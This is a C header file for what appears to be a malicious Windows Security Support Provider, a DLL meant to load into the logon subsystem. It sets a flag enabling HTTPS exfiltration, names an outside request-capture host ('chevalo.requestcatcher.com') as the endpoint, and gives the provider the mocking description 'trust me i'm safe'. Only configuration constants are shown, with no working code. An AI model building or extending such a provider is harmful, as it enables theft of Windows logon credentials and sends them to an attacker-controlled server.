#pragma once
#define WIN32_NO_STATUS
#define SECURITY_WIN32
#include <windows.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>
#include <stdio.h>

#define HTTPS_EXFILTRATION 1
#define HTTPS_ENDPOINT L"chevalo.requestcatcher.com"
#define USERAGENT L"WinHTTP Example/1.0"

#define SSP_NAME L"chevalo"
#define SSP_COMMENT L"chevalo trust me i'm safe"


#define BUFFER_SIZE 512
